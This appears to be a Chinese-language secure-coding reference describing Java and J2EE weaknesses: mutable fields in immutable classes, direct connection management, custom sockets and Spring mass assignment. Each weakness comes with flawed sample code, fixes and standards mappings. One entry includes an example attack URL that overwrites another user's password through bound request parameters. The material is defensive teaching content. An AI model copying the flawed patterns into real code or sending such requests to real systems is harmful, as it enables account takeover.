<h4 id="Immutable-Classes-Field-Mutation"><a href="#Immutable-Classes-Field-Mutation" class="headerlink" title="Immutable Classes: Field Mutation"></a>Immutable Classes: Field Mutation</h4><h5 id="ABSTRACT-23"><a href="#ABSTRACT-23" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该类被注释为不可变，但是字段可变。</p>
<h5 id="EXPLANATION-23"><a href="#EXPLANATION-23" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>此类带有来自 JCIP 注释包的“不可变”注释。然而，该类的可变字段之一具有在构造函数和析构函数之外对其进行调用的变化的方法。</p>
<p>示例 1：不可变最终类的下列代码将集声明为 private 和 final，然后错误地创建了改变集的方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@Immutable</span><br><span class="line"></span><br><span class="line">public final class ThreeStooges &#123;</span><br><span class="line"></span><br><span class="line">  private final Set stooges = new HashSet&gt;();</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  public void addStooge(String name) &#123; </span><br><span class="line"></span><br><span class="line">    stooges.add(name);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-23"><a href="#RECOMMENDATIONS-23" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>所有可变类型的字段（例如，Java Collection 类）必须为 private，并且不能在不可变类的构造函数和析构函数以外进行更新。应删除任何试图改变该字段的类的方法。</p>
<h5 id="REFERENCES-21"><a href="#REFERENCES-21" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] B. Goetz Java Concurrency in Practice. Chapter 3: Sharing Objects Guidelines</p>
<p>[2] Package net.jcip.annotations Specification</p>
<p>[3] MUTABLE-1: Prefer immutability for value types Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 471</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<h4 id="Immutable-Classes-Non-final-Fields"><a href="#Immutable-Classes-Non-final-Fields" class="headerlink" title="Immutable Classes: Non-final Fields"></a>Immutable Classes: Non-final Fields</h4><h5 id="ABSTRACT-24"><a href="#ABSTRACT-24" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该类被注释为不可变，但是字段并非 final。</p>
<h5 id="EXPLANATION-24"><a href="#EXPLANATION-24" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>此类带有来自 JCIP 注释包的 Immutable 注释。非最终字段允许更改值，从而违反了类的不可变性。</p>
<p>例 1：不可变最终类的下列代码错误地将字段声明为 public 和非 final。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@Immutable</span><br><span class="line"></span><br><span class="line">public class ImmutableInteger &#123;</span><br><span class="line"></span><br><span class="line">public int value;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-24"><a href="#RECOMMENDATIONS-24" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>不可变类的所有字段都应是最终的。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@Immutable</span><br><span class="line"></span><br><span class="line">public class ImmutableInteger &#123;</span><br><span class="line"></span><br><span class="line">public final int value;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-22"><a href="#REFERENCES-22" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] B. Goetz Java Concurrency in Practice. Chapter 3: Sharing Objects Guidelines</p>
<p>[2] Package net.jcip.annotations Specification</p>
<p>[3] OBJ00-J. Limit extensibility of classes and methods with invariants CERT</p>
<p>[4] MUTABLE-1: Prefer immutability for value types Oracle</p>
<p>[5] Standards Mapping - Common Weakness Enumeration CWE ID 471</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<h4 id="Immutable-Classes-Public-Mutable-Fields"><a href="#Immutable-Classes-Public-Mutable-Fields" class="headerlink" title="Immutable Classes: Public Mutable Fields"></a>Immutable Classes: Public Mutable Fields</h4><h5 id="ABSTRACT-25"><a href="#ABSTRACT-25" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该类被注释为不可变，但是字段可变。</p>
<h5 id="EXPLANATION-25"><a href="#EXPLANATION-25" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>此类带有来自 JCIP 注释包的“不可变”注释。可变类型的公共字段允许类的外部代码修改该类的内容和违反其不可变性。</p>
<p>例 1：不可变最终类的下列代码错误地将集声明为 public 和 final。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@Immutable</span><br><span class="line"></span><br><span class="line">public final class ThreeStooges &#123;</span><br><span class="line"></span><br><span class="line">public final Set stooges = new HashSet();</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-25"><a href="#RECOMMENDATIONS-25" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>因为可变类型的内容（例如，Java Collection 类）不受 final 关键字的保护，所以可变字段必须始终声明为 private。无论什么时候，尽可能把所有成员变量都设置为 private。通过获取方法提供针对 private 成员变量的受控制的访问方式。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@Immutable</span><br><span class="line"></span><br><span class="line">public final class ThreeStooges &#123;</span><br><span class="line"></span><br><span class="line">private final Set stooges = new HashSet();</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-23"><a href="#REFERENCES-23" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] B. Goetz Java Concurrency in Practice. Chapter 3: Sharing Objects Guidelines</p>
<p>[2] Package net.jcip.annotations Specification</p>
<p>[3] MUTABLE-1: Prefer immutability for value types Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 471</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<h4 id="J2EE-Bad-Practices-getConnection"><a href="#J2EE-Bad-Practices-getConnection" class="headerlink" title="J2EE Bad Practices: getConnection()"></a>J2EE Bad Practices: getConnection()</h4><h5 id="ABSTRACT-26"><a href="#ABSTRACT-26" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>J2EE 标准禁止对连接实行直接管理。</p>
<h5 id="EXPLANATION-26"><a href="#EXPLANATION-26" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>J2EE 标准要求应用程序采用容器的资源管理器工具获取连接资源。</p>
<p>例如，一个 J2EE 应用程序应采用下列方式获取数据库连接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctx = new InitialContext();</span><br><span class="line"></span><br><span class="line">datasource = (DataSource)ctx.lookup(DB_DATASRC_REF);</span><br><span class="line"></span><br><span class="line">conn = datasource.getConnection();</span><br></pre></td></tr></table></figure>
<p>并避免采用下列方式获取连接：</p>
<p><code>conn = DriverManager.getConnection(CONNECT_STRING);</code><br>每个主要的 Web 应用程序容器都提供了数据库连接管理，并将其作为资源管理框架的一部分。在应用程序中重写这个功能，其过程既复杂又容易出错，这也是 J2EE 标准禁止这种行为的原因之一。</p>
<h5 id="RECOMMENDATIONS-26"><a href="#RECOMMENDATIONS-26" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>应当采用 JNDI 寻找合适的连接代理 (connection factory)，来替代直接调用 DriverManager.getConnection()，并从连接代理中获取连接。</p>
<h5 id="REFERENCES-24"><a href="#REFERENCES-24" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Java 2 Platform Enterprise Edition Specification, v1.4 Sun Microsystems</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 245</p>
<h4 id="J2EE-Bad-Practices-Sockets"><a href="#J2EE-Bad-Practices-Sockets" class="headerlink" title="J2EE Bad Practices: Sockets"></a>J2EE Bad Practices: Sockets</h4><h5 id="ABSTRACT-27"><a href="#ABSTRACT-27" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在 Web 应用程序中使用基于套接字的通信往往容易出错。</p>
<h5 id="EXPLANATION-27"><a href="#EXPLANATION-27" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>只有在与比较陈旧的系统进行通信时，J2EE 标准才允许 use of sockets，因为此时没有较高高级别的协议可用。自己编写通信协议将需要解决许多安全上的问题，包括：</p>
<p>— 输入信号与输出信号的比较</p>
<p>— 协议版本间的兼容性</p>
<p>— 通道安全</p>
<p>— 错误处理</p>
<p>— 网络限制（防火墙）</p>
<p>— 会话管理</p>
<p>若不经过安全专家的详细审查，自定义的通信协议将面临诸多安全隐患。</p>
<p>在自定义标准协议的应用过程中，也会碰到许多同样的问题。通常有很多可用的资源都可以解决与标准协议相关的各种安全问题，然而，攻击者也能获取这些资源。</p>
<h5 id="RECOMMENDATIONS-27"><a href="#RECOMMENDATIONS-27" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>应使用行业标准协议或框架来替代自定义的通讯协议。您首先应考虑是否可以使用现有协议，如 HTTP、FTP、SMTP、CORBA、RMI/IIOP、EJB 或 SOAP。</p>
<p>对于选择的协议实现方法，应考虑对其安全进行跟踪记录。</p>
<h5 id="REFERENCES-25"><a href="#REFERENCES-25" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Java 2 Platform Enterprise Edition Specification, v1.4 Sun Microsystems</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 246</p>
<h4 id="Mass-Assignment-Insecure-Binder-Configuration"><a href="#Mass-Assignment-Insecure-Binder-Configuration" class="headerlink" title="Mass Assignment: Insecure Binder Configuration"></a>Mass Assignment: Insecure Binder Configuration</h4><h5 id="ABSTRACT-28"><a href="#ABSTRACT-28" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>用于将 HTTP 请求参数绑定到模型类的框架绑定器未明确配置为允许或禁止特定属性</p>
<h5 id="EXPLANATION-28"><a href="#EXPLANATION-28" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>为了简化开发并提高生产率，大多数现代框架允许自动实例化一个对象，并使用其名称与要绑定的类的属性相匹配的 HTTP 请求参数填充该对象。 对象的自动实例化和填充加快了开发速度，但如果不谨慎实施，则会导致严重的问题。 绑定类或嵌套类中的任何属性都将自动绑定到 HTTP 请求参数。 因此，恶意用户能够为绑定类或嵌套类中的任何属性分配值，即使这些属性未通过 Web 表单或 API 合约向客户端公开也是如此。</p>
<p>示例 1： 在没有额外配置的情况下使用 Spring WebFlow，以下操作会将 HTTP 请求参数绑定到<br>Booking 类中的任何属性：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   &lt;view-state id=&quot;enterBookingDetails&quot; model=&quot;booking&quot;&gt;</span><br><span class="line"></span><br><span class="line">	&lt;on-render&gt;</span><br><span class="line"></span><br><span class="line">		&lt;render fragments=&quot;body&quot; /&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/on-render&gt;</span><br><span class="line"></span><br><span class="line">       &lt;transition on=&quot;proceed&quot; to=&quot;reviewBooking&quot;&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/transition&gt;</span><br><span class="line"></span><br><span class="line">	&lt;transition on=&quot;cancel&quot; to=&quot;cancel&quot; bind=&quot;false&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/view-state&gt;</span><br></pre></td></tr></table></figure>
<p>其中，Booking 类定义为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public class Booking implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">	private Long id;</span><br><span class="line"></span><br><span class="line">	private User user;</span><br><span class="line"></span><br><span class="line">	private Hotel hotel;</span><br><span class="line"></span><br><span class="line">	private Date checkinDate;</span><br><span class="line"></span><br><span class="line">	private Date checkoutDate;</span><br><span class="line"></span><br><span class="line">	private String creditCard;</span><br><span class="line"></span><br><span class="line">	private String creditCardName;</span><br><span class="line"></span><br><span class="line">	private int creditCardExpiryMonth;</span><br><span class="line"></span><br><span class="line">	private int creditCardExpiryYear;</span><br><span class="line"></span><br><span class="line">	private boolean smoking;</span><br><span class="line"></span><br><span class="line">	private int beds;</span><br><span class="line"></span><br><span class="line">	private Set&lt;Amenity&gt; amenities;</span><br><span class="line"></span><br><span class="line">   // Public Getters and Setters</span><br><span class="line"></span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-28"><a href="#RECOMMENDATIONS-28" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>当使用提供自动模型绑定功能的框架时，最佳做法是控制将哪些属性绑定到模型对象，这样，即使攻击者找出模型或嵌套类的其他未公开属性，他们也无法通过 HTTP 请求参数绑定任意值。</p>
<p>示例 2： Spring 模型绑定器 (3.x) 配置为禁止绑定敏感属性：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">   &lt;view-state id=&quot;enterBookingDetails&quot; model=&quot;booking&quot;&gt;</span><br><span class="line"></span><br><span class="line">	&lt;binder&gt;</span><br><span class="line"></span><br><span class="line">		&lt;binding property=&quot;checkinDate&quot; /&gt;</span><br><span class="line"></span><br><span class="line">		&lt;binding property=&quot;checkoutDate&quot; /&gt;</span><br><span class="line"></span><br><span class="line">		&lt;binding property=&quot;beds&quot; /&gt;</span><br><span class="line"></span><br><span class="line">		&lt;binding property=&quot;smoking&quot; /&gt;</span><br><span class="line"></span><br><span class="line">		&lt;binding property=&quot;creditCard&quot; /&gt;</span><br><span class="line"></span><br><span class="line">		&lt;binding property=&quot;creditCardName&quot; /&gt;</span><br><span class="line"></span><br><span class="line">		&lt;binding property=&quot;creditCardExpiryMonth&quot; /&gt;</span><br><span class="line"></span><br><span class="line">		&lt;binding property=&quot;creditCardExpiryYear&quot; /&gt;</span><br><span class="line"></span><br><span class="line">		&lt;binding property=&quot;amenities&quot; /&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/binder&gt;</span><br><span class="line"></span><br><span class="line">	&lt;on-render&gt;</span><br><span class="line"></span><br><span class="line">		&lt;render fragments=&quot;body&quot; /&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/on-render&gt;</span><br><span class="line"></span><br><span class="line">       &lt;transition on=&quot;proceed&quot; to=&quot;reviewBooking&quot;&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/transition&gt;</span><br><span class="line"></span><br><span class="line">	&lt;transition on=&quot;cancel&quot; to=&quot;cancel&quot; bind=&quot;false&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/view-state&gt;</span><br></pre></td></tr></table></figure>
<p>通过控制哪些属性公开，攻击者无法将任意值绑定到酒店的属性，例如更改房间的价格。</p>
<p>防止出现批量分配漏洞的另一方法是使用将 HTTP 请求参数绑定到 DTO 对象的分层体系结构。 DTO 对象仅用于该目的，仅公开 Web 表单或 API 合约中定义的那些属性，然后将这些 DTO 对象映射到可以定义其余私有属性的域对象。</p>
<h5 id="REFERENCES-26"><a href="#REFERENCES-26" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] OWASP Mass assignment </p>
<p>[2] Pivotal Spring MVC Known Vulnerabilities and Issues </p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 915 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001082, CCI-002754 </p>
<p>[5] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.1.2 Input Validation Requirements </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A5 Broken Access Control </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.2 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.8 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.4 - Authentication and Access Control </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Web Application Security Consortium Version 2.00 Abuse of Functionality (WASC-42) </p>
<h4 id="Mass-Assignment-Request-Parameters-Bound-into-Persisted-Objects"><a href="#Mass-Assignment-Request-Parameters-Bound-into-Persisted-Objects" class="headerlink" title="Mass Assignment: Request Parameters Bound into Persisted Objects"></a>Mass Assignment: Request Parameters Bound into Persisted Objects</h4><h5 id="ABSTRACT-29"><a href="#ABSTRACT-29" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果允许使用请求参数自动填充数据库持久实体，攻击者将能够在中间实体中创建计划外的数据库记录，或者更新实体对象中的计划外字段。</p>
<h5 id="EXPLANATION-29"><a href="#EXPLANATION-29" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>持久对象通常绑定到底层数据库，并由持久性框架（如 Hibernate 或 JPA）自动更新。如果允许这些对象自动绑定到 Spring MVC 的请求，攻击者将能够通过提供附加的请求参数向数据库中注入非预期的值。 例 1：Order、Customer 和 Profile 都是 Hibernate 持久类。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">public class Order &#123;</span><br><span class="line"></span><br><span class="line">	String ordered;</span><br><span class="line"></span><br><span class="line">	List lineItems;</span><br><span class="line"></span><br><span class="line">	Customer cust;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class Customer &#123;</span><br><span class="line"></span><br><span class="line">	String customerId;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">    Profile p;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class Profile &#123;</span><br><span class="line"></span><br><span class="line">	String profileId;</span><br><span class="line"></span><br><span class="line">	String username;</span><br><span class="line"></span><br><span class="line">	String password;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>OrderController 是处理该请求的 Spring 控制器类：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line"></span><br><span class="line">public class OrderController &#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	@RequestMapping(&quot;/updateOrder&quot;)</span><br><span class="line"></span><br><span class="line">	public String updateOrder(Order order) &#123;</span><br><span class="line"></span><br><span class="line">		...</span><br><span class="line"></span><br><span class="line">		session.save(order);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为命令类会自动绑定到该请求，所以利用这一漏洞，攻击者可以通过在该请求中添加如下请求参数来更新其他用户的密码：“<a href="http://www.yourcorp.com/webApp/updateOrder?order.customer.profile.profileId=1234&amp;order.customer.profile.password=urpowned”" target="_blank" rel="noopener">http://www.yourcorp.com/webApp/updateOrder?order.customer.profile.profileId=1234&amp;order.customer.profile.password=urpowned”</a></p>
<h5 id="RECOMMENDATIONS-29"><a href="#RECOMMENDATIONS-29" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请不要使用持久实体对象作为请求绑定对象。应手动将请求绑定对象中需要持久保留的属性复制到持久实体对象。或者，应明确定义请求绑定对象中可以通过请求参数设置的属性。</p>
<h5 id="REFERENCES-27"><a href="#REFERENCES-27" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Ryan Berg and Dinis Cruz Two Security Vulnerabilities in the Spring Framework’s MVC</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 915</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
